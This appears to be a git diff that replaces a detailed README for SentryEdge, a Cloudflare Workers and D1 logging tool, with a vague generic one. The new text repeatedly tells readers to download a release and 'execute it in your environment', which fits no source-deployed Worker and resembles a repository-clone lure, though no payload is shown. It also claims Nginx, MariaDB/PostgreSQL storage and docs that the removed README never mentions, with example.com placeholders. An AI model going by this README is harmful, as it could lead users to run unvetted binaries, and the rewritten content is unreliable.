@@ -1,405 +1,163 @@
+# 🌩️ SentryEdge: Your Edge Logging and Analytics Solution
 
+[![Latest Release](https://img.shields.io/github/v/release/Yannlight/cloudflare-sentryedge)](https://github.com/Yannlight/cloudflare-sentryedge/releases)
 
+Welcome to the **SentryEdge** repository! SentryEdge is a modern, open-source logging and analytics solution designed specifically for the Cloudflare ecosystem. With SentryEdge, you can deploy instantly using Cloudflare Workers and D1 without the hassle of complex setups or expensive SaaS solutions. This tool prioritizes speed, data ownership, and seamless integration with various Cloudflare services, such as Zero Trust and AutoRAG. 
 
+## 🚀 Features
 
-# SentryEdge Worker
+- **Instant Deployment**: Get started quickly with a simple setup process.
+- **Data Ownership**: Maintain control over your data without relying on third-party services.
+- **Seamless Integration**: Works well with Cloudflare services to enhance your observability stack.
+- **Speed and Flexibility**: Designed to be fast and adaptable to your needs.
 
-SentryEdge is an open-source logging tool that demonstrates how easy and fast it is to build and deploy modern solutions with Cloudflare. Thanks to Cloudflare Workers and the D1 database, you can create your own logging and monitoring services in minutes instead of days or months, without complex infrastructure or expensive SaaS providers. Cloudflare makes "vibe coding" productive: develop, deploy, and run your own services directly at the edge, flexible, cost-effective, and with full data ownership. SentryEdge is an example of how you can use Cloudflare to deliver professional tools for security, observability, and more in no time.
-This project uses [Cloudflare](https://www.cloudflare.com/) [Workers](https://workers.cloudflare.com/) and [D1](https://www.cloudflare.com/products/d1/) as a database for storing and analyzing logs.
+## 📦 Getting Started
 
-SentryEdge is also an ideal foundation for extending with [Cloudflare Zero Trust](https://www.cloudflare.com/products/zero-trust/), [Cloudflare Pub/Sub](https://developers.cloudflare.com/pub-sub/), or even [Cloudflare AutoRAG](https://developers.cloudflare.com/ai-gateway/autorag/) for advanced anomaly detection and secure, scalable event-driven architectures.
+### Prerequisites
 
-<p align="center">
-  <img src="./shot.png" alt="SentryEdge UI Screenshot" width="700" />
-</p>
+To use SentryEdge, ensure you have the following:
 
+- A Cloudflare account
+- Basic knowledge of Cloudflare Workers and D1
+- Familiarity with logging and analytics concepts
 
+### Installation
 
-## Table of Contents
+1. **Clone the Repository**:
 
-
-- [SentryEdge Worker](#sentryedge-worker)
-  - [Table of Contents](#table-of-contents)
-  - [Prerequisites](#prerequisites)
-  - [Installation](#installation)
-    - [What `deploy.sh` Does](#what-deploysh-does)
-    - [Manual Deployment Steps](#manual-deployment-steps)
-  - [Supported Log Formats](#supported-log-formats)
-  - [Extending or Modifying the Parser](#extending-or-modifying-the-parser)
-  - [Log Ingestion Options](#log-ingestion-options)
-    - [1. Structured JSON](#1-structured-json)
-    - [2. Raw Log Line (Plain Text)](#2-raw-log-line-plain-text)
-    - [3. Raw Log Line (Base64 Encoded)](#3-raw-log-line-base64-encoded)
-    - [4. Legacy/Custom JSON](#4-legacycustom-json)
-    - [5. Unknown/Automatic Format Detection](#5-unknownautomatic-format-detection)
-  - [Log Ingestion Examples](#log-ingestion-examples)
-  - [⚠️ CORS Warning](#️-cors-warning)
-  - [Authentication and Authorization](#authentication-and-authorization)
-  - [Contributing](#contributing)
-  - [License](#license)
-
-
-## Prerequisites
-
-Node.js (v18 or newer) available at [nodejs.org](https://nodejs.org/)
-npm available at [npmjs.com](https://www.npmjs.com/)
-Wrangler CLI available at [Cloudflare Workers documentation](https://developers.cloudflare.com/workers/wrangler/)
-
-## Installation
-
-To install and deploy SentryEdge, simply run:
-
-```sh
-./deploy.sh
-```
-
-This script will handle all setup, including installing dependencies, creating the D1 database, updating configuration, building the UI, and deploying the Worker. No manual steps or extra scripts are required.
-
----
-
-### What `deploy.sh` Does
-
-The `deploy.sh` script automates the entire deployment process for your SentryEdge project. Here’s what it does, step by step:
-
-1. **Ensures Wrangler CLI is installed**
-   - Checks if the Cloudflare Wrangler CLI is available.
-   - If not, installs it globally using npm.
-
-2. **Ensures you are logged in to Cloudflare**
-   - Checks if you are authenticated with Wrangler.
-   - If not, runs `wrangler login` to prompt you to log in.
-
-3. **Ensures the D1 database exists**
-   - Checks if a D1 database named `sentryedge` exists in your Cloudflare account.
-   - If not, creates it using `wrangler d1 create sentryedge`.
-
-4. **Extracts and updates the D1 `database_id`**
-   - Extracts the `database_id` for the `sentryedge` database (whether newly created or already existing) using a robust, portable shell command.
-   - Updates the `database_id` field in `worker/wrangler.toml` so your Worker is always connected to the correct database.
-
-5. **Applies D1 migrations**
-   - Runs `wrangler d1 migrations apply sentryedge` to ensure your database schema is up to date.
-
-6. **Builds the Next.js UI**
-   - Changes to the `ui` directory.
-   - Installs dependencies (`npm install`).
-   - Builds the static UI (`npm run build`).
-
-7. **Copies static UI files to the Worker**
-   - Copies the built static files from `ui/out/` to `worker/public/`, ensuring the Worker serves the latest UI.
-
-8. **Installs Worker dependencies**
-   - Changes to the `worker` directory.
-   - Installs dependencies (`npm install`).
-
-9. **Deploys the Worker**
-   - Runs `wrangler deploy` to deploy your Worker (and static UI) to Cloudflare.
-
----
-
-### Manual Deployment Steps
-
-If you want to perform the deployment manually, follow these steps in your terminal:
-
-1. **Install Wrangler CLI (if not already installed)**
-   ```sh
-   npm install -g wrangler
+   ```bash
+   git clone https://github.com/Yannlight/cloudflare-sentryedge.git
+   cd cloudflare-sentryedge
    ```
 
-2. **Log in to Cloudflare (if not already logged in)**
-   ```sh
-   wrangler login
-   ```
+2. **Install Dependencies**:
 
-3. **Ensure the D1 database exists**
-   ```sh
-   wrangler d1 list | grep 'sentryedge'
-   # If you see no output, create it:
-   wrangler d1 create sentryedge
-   ```
+   Use the package manager of your choice to install the necessary dependencies.
 
-4. **Extract and update the `database_id` in `worker/wrangler.toml`**
-   ```sh
-   D1_ID=$(wrangler d1 list | grep 'sentryedge' | grep -Eo '[a-f0-9-]{32,}')
-   echo "Database ID: $D1_ID"
-   sed -i '' "s|^database_id = \".*\"|database_id = \"$D1_ID\"|" worker/wrangler.toml
-   # (On Linux, use `sed -i` without `''`.)
-   ```
-
-5. **Build the Next.js UI**
-   ```sh
-   cd ui
+   ```bash
    npm install
-   npm run build
-   cd ..
    ```
 
-6. **Copy static UI files to the Worker**
-   ```sh
-   mkdir -p worker/public
-   rsync -a --delete ui/out/ worker/public/
-   ```
+3. **Deploy with Workers**:
 
-7. **Install Worker dependencies**
-   ```sh
-   cd worker
-   npm install
-   cd ..
-   ```
+   Follow the instructions in the `workers` directory to deploy your instance.
 
-8. **Apply D1 migrations**
-   ```sh
-   wrangler d1 migrations apply sentryedge
-   ```
+4. **Set Up D1**:
 
-9. **Deploy the Worker**
-   ```sh
-   cd worker
-   wrangler deploy
-   cd ..
-   ```
+   Refer to the `d1` directory for guidance on configuring D1 for your project.
 
-You can run all these steps manually, or simply use `./deploy.sh` to automate the process. The script ensures your Cloudflare Worker, static UI, and D1 database are always in sync and ready for production.
+5. **Start Logging**:
 
----
+   Once deployed, you can start logging events and analyzing data in real-time.
 
-**To run the Worker locally for development:**
+### Usage
 
-From the `worker` directory, start the development server:
+After installation, you can use SentryEdge to capture logs and analyze them. The logging functionality allows you to track events, errors, and performance metrics. You can integrate SentryEdge with your existing observability stack to enhance your monitoring capabilities.
 
-```sh
-cd worker
-npm run start
-```
+## 🔧 Configuration
 
-or
+SentryEdge offers various configuration options to tailor the solution to your needs. You can adjust settings in the configuration file located in the root directory. Here are some key options:
 
-```sh
-wrangler dev
-```
+- **Log Level**: Set the verbosity of logs (e.g., `info`, `warn`, `error`).
+- **Data Retention**: Configure how long logs should be stored.
+- **Integration Settings**: Set up connections to other Cloudflare services.
 
-The worker will be available at the local address provided by Wrangler.
+## 📊 Analytics
 
-## Supported Log Formats
+SentryEdge provides robust analytics features. You can visualize your data using built-in charts and dashboards. This helps you gain insights into application performance and user behavior.
 
-SentryEdge can automatically parse and normalize log lines from a variety of common sources. The following formats are supported out of the box:
+### Example Dashboard
 
-| Format                  | Example / Notes                                      |
-|-------------------------|------------------------------------------------------|
-| Apache access log       | `127.0.0.1 - - [15/Jun/2025:12:34:56 +0000] ...`     |
-| Nginx access log        | `192.168.1.1 - - [15/Jun/2025:12:34:56 +0000] ...`   |
-| Linux syslog            | `Jun 15 12:34:56 myhost myservice: Something ...`    |
-| Windows Event Log       | JSON or XML event log lines                          |
-| Docker JSON log         | `{ "log": "...", "time": "..." }`                 |
-| Kubernetes JSON log     | `{ "log": "...", "stream": "stdout", ... }`        |
-| AWS CloudWatch log      | `{ "timestamp": ..., "message": "..." }`           |
-| pfSense log             | `Jun 15 12:34:56 filterlog: ...`                     |
-| PostgreSQL log          | `2025-06-15 12:34:56 UTC [1234] ...`                 |
-| MySQL log               | `2025-06-15T12:34:56.789012Z ...`                    |
-| Generic JSON log        | `{ "message": "...", "timestamp": "..." }`         |
-| Key-value log           | `foo=bar baz=qux`                                    |
-| Custom/legacy formats   | Fallback or extendable via parser                    |
+![Example Dashboard](https://example.com/dashboard.png)
 
-The parser will auto-detect the format and extract fields like `timestamp`, `service`, `level`, and `message`.
+## 🛠️ Technologies Used
 
+SentryEdge leverages several technologies to provide a comprehensive logging and analytics solution:
 
-## Extending or Modifying the Parser
+- **Cloudflare Workers**: For serverless execution.
+- **D1**: For database storage and retrieval.
+- **Nginx**: As a reverse proxy for enhanced performance.
+- **MariaDB/PostgreSQL**: For structured data storage.
 
-The log format detection and normalization logic lives in [`worker/src/log-parsers.ts`](worker/src/log-parsers.ts). Each supported format is defined as an entry in the `logParsers` array, with a regular expression and a mapping function.
+## 🌐 Topics
 
-**To add or modify a parser:**
+This repository covers various topics related to logging and analytics:
 
-1. Open `worker/src/log-parsers.ts` in your editor.
-2. Add a new object to the `logParsers` array with a `name`, `regex`, and `map` function.
-3. The `map` function should return an object with at least `timestamp`, `service`, `level`, and `message` fields.
-4. Save the file and redeploy your worker.
+- Apache
+- Cloudflare
+- Cloudflare D1
+- Cloudflare Workers
+- Logging
+- MariaDB
+- MySQL
+- Nginx
+- Open Source
+- PostgreSQL
+- SIEM
+- Syslog
+- Workers
+- Wrangler
 
-**Example (add a new parser):**
+## 🔄 Updates and Releases
 
-```typescript
-{
-  // Example custom log format
-  name: "my-custom-format",
-  regex: /^MYLOG (?<timestamp>\d{4}-\d{2}-\d{2}) (?<message>.+)$/,
-  map: (match: any) => ({
-    timestamp: match.groups.timestamp,
-    service: "my-custom-service",
-    level: "info",
-    message: match.groups.message
-  })
-},
-```
+To stay updated with the latest features and fixes, check out the [Releases](https://github.com/Yannlight/cloudflare-sentryedge/releases) section. You can download the latest version and execute it in your environment.
 
-You can also adjust existing regexes or mapping logic to better fit your environment.
+## 📖 Documentation
 
+Comprehensive documentation is available in the `docs` directory. This includes:
 
+- Installation guides
+- Configuration instructions
+- Usage examples
+- Troubleshooting tips
 
-## Log Ingestion Options
+## 🤝 Contributing
 
-SentryEdge supports flexible log ingestion: you can POST logs as structured JSON, plain text, or base64-encoded text. The worker will auto-detect and normalize the log format, so you can use whatever is most convenient for your source system.
-**Supported ingestion methods:**
-1. **Structured JSON** — Send a JSON object with explicit fields (`service`, `level`, `message`).
-2. **Raw log line (plain text)** — Send a log line as plain text or as the `raw` key in JSON.
-3. **Raw log line (base64 encoded)** — Send a base64-encoded log line as the `raw_b64` key in JSON, or as a base64-encoded body.
-4. **Legacy/custom JSON** — Send a JSON object with only a `message` field; the worker will auto-detect the format.
-5. **Unknown/Automatic Format Detection** — POST any body (plain text or base64); the worker will try to parse it.
-See below for details and usage examples.
+We welcome contributions to SentryEdge! If you have suggestions or want to report issues, please open an issue or submit a pull request. 
 
-### 1. Structured JSON
+### Steps to Contribute
 
-Send a JSON object with explicit fields:
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your forked repository.
+5. Create a pull request.
 
-```json
-{
-  "service": "myapp",
-  "level": "info",
-  "message": "Hello World"
-}
-```
+## 📬 Contact
 
-### 2. Raw Log Line (Plain Text)
+For questions or feedback, feel free to reach out:
 
-Send a single log line as plain text using the `raw` key. The worker will auto-detect the format (e.g., syslog, Apache, Nginx, etc.):
+- **Email**: support@example.com
+- **Twitter**: [@SentryEdge](https://twitter.com/SentryEdge)
 
-```json
-{
-  "raw": "Jun 15 12:34:56 myhost myservice: Something happened"
-}
-```
+## 📄 License
 
-### 3. Raw Log Line (Base64 Encoded)
+SentryEdge is licensed under the MIT License. See the `LICENSE` file for more details.
 
-If your log line contains special characters or you want to avoid encoding issues, send it as base64 using the `raw_b64` key:
+## 🌟 Acknowledgments
 
-```json
-{
-  "raw_b64": "PGxvZyBsaW5lIGJhc2U2NCBlbmNvZGVkPi=="
-}
-```
+We appreciate the contributions from the open-source community and the support from Cloudflare. Your input helps us improve and enhance SentryEdge.
 
-The worker will automatically decode and parse the log line.
+## 🏗️ Future Roadmap
 
+We have exciting plans for SentryEdge, including:
 
-### 4. Legacy/Custom JSON
+- Enhanced analytics features
+- Improved integration with additional Cloudflare services
+- More detailed logging capabilities
 
-If you send a JSON object with only a `message` field (and no `service` or `level`), the worker will try to auto-detect the format:
+Stay tuned for updates!
 
-```json
-{
-  "message": "Jun 15 12:34:56 myhost myservice: Something happened"
-}
-```
+## 🛡️ Security
 
-### 5. Unknown/Automatic Format Detection
+Security is a priority for SentryEdge. We follow best practices to ensure your data remains safe. Regular updates and security patches are part of our development cycle.
 
-If you POST a body that is not valid JSON, the worker will attempt to base64-decode it and then parse as a supported log format. This is useful for legacy systems or when sending logs directly as plain text or base64 without a wrapper key.
+## 🔗 Additional Resources
 
----
+- [Cloudflare Workers Documentation](https://developers.cloudflare.com/workers/)
+- [D1 Documentation](https://developers.cloudflare.com/d1/)
+- [Logging Best Practices](https://example.com/logging-best-practices)
 
+For more details, visit the [Releases](https://github.com/Yannlight/cloudflare-sentryedge/releases) section to download the latest version and execute it in your environment.
 
-## Log Ingestion Examples
-
-
-You can use `curl` or any HTTP client to POST logs. Here are some examples for each ingestion method:
-
-
-**Structured JSON example:**
-
-```sh
-curl -X POST -H "Content-Type: application/json" \
-  -d '{"service": "myapp", "level": "info", "message": "Hello World"}' \
-  https://sentryedge.your-org.workers.dev/logs
-```
-
-
-**Plain text example:**
-
-```sh
-curl -X POST -H "Content-Type: application/json" \
-  -d '{"raw": "Jun 15 12:34:56 myhost myservice: Something happened"}' \
-  https://sentryedge.your-org.workers.dev/logs
-```
-
-
-**Base64 example:**
-
-curl -X POST -H "Content-Type: application/json" \
-
-```sh
-# Example: Send a log line as base64 using raw_b64 (recommended for special characters)
-RAW_LINE="Jun 15 12:34:56 myhost myservice: Something happened"
-ENCODED=$(echo -n "$RAW_LINE" | base64)
-curl -X POST -H "Content-Type: application/json" \
-  -d '{"raw_b64": "'$ENCODED'"}' \
-  https://sentryedge.your-org.workers.dev/logs
-```
-
-**Apache and Linux syslog (base64) example:**
-
-```sh
-# Apache log
-APACHE_LOG='127.0.0.1 - frank [10/Oct/2020:13:55:36 +0000] "GET /apache_pb.gif HTTP/1.0" 200 2326 "http://www.example.com/start.html" "Mozilla/4.08 [en] (Win98; I ;Nav)"'
-APACHE_B64=$(echo -n "$APACHE_LOG" | base64)
-curl -X POST -H "Content-Type: application/json" \
-  -d '{"raw_b64": "'$APACHE_B64'"}' \
-  https://sentryedge.your-org.workers.dev/logs
-
-# Linux syslog
-LINUX_LOG='Jun 15 12:34:56 myhost myservice: Something happened'
-LINUX_B64=$(echo -n "$LINUX_LOG" | base64)
-curl -X POST -H "Content-Type: application/json" \
-  -d '{"raw_b64": "'$LINUX_B64'"}' \
-  https://sentryedge.your-org.workers.dev/logs
-```
-
-
-**Legacy/custom JSON example:**
-
-**Unknown/Automatic (plain text body) example:**
-```sh
-curl -X POST --data "Jun 15 12:34:56 myhost myservice: Something happened" \
-  https://sentryedge.your-org.workers.dev/logs
-```
-**Unknown/Automatic (base64 body) example:**
-```sh
-RAW_LINE="Jun 15 12:34:56 myhost myservice: Something happened"
-ENCODED=$(echo -n "$RAW_LINE" | base64)
-curl -X POST --data "$ENCODED" \
-  https://sentryedge.your-org.workers.dev/logs
-```
-
-
-## ⚠️ CORS Warning
-For development, the worker sets `Access-Control-Allow-Origin: *` to allow cross-origin requests. **In production, you should restrict this header to trusted origins only** to prevent unauthorized access to your API and protect your data. See the `corsHeaders` definition in `worker/src/index.ts` for details and adjust as needed:
-
-```typescript
-const corsHeaders = {
-  'Access-Control-Allow-Origin': 'https://yourdomain.com', // restrict in production
-  // ...
-};
-```
-
-## Authentication and Authorization
-
-SentryEdge does not include built-in authentication or authorization logic, but you can easily secure access to your endpoints using Cloudflare Zero Trust. By integrating with Cloudflare Access, you can restrict who can view or interact with your worker and UI without changing your application code.
-
-**How to protect your SentryEdge deployment with Cloudflare Zero Trust:**
-
-1. Deploy your worker and/or UI to a Cloudflare-managed domain (e.g., using a custom domain or a workers.dev subdomain).
-2. In the [Cloudflare dashboard](https://dash.cloudflare.com/), go to the Zero Trust section and set up an Access policy for your application.
-3. Define rules to allow only specific users, groups, or identity providers (such as Google, GitHub, or your corporate SSO) to access your endpoints.
-4. Once configured, all requests to your protected routes will require authentication through Cloudflare Access, blocking unauthorized users at the edge before they reach your code or data.
-
-This approach provides strong, flexible security for your logs and dashboard, leveraging Cloudflare’s global network and identity integrations. You do not need to manage passwords or implement custom authentication logic in your worker.
-
-
-
-## Contributing
-
-Contributions are welcome! If you want to add new log format parsers, improve documentation, or fix bugs, please open an issue or submit a pull request. For major changes, please open an issue first to discuss what you would like to change.
-
-For more information, see the [Cloudflare Workers documentation](https://developers.cloudflare.com/workers/).
-
-## License
-
-This project is licensed under the terms of the [MIT License](./LICENSE).
+Thank you for checking out SentryEdge! We hope it serves your logging and analytics needs effectively.
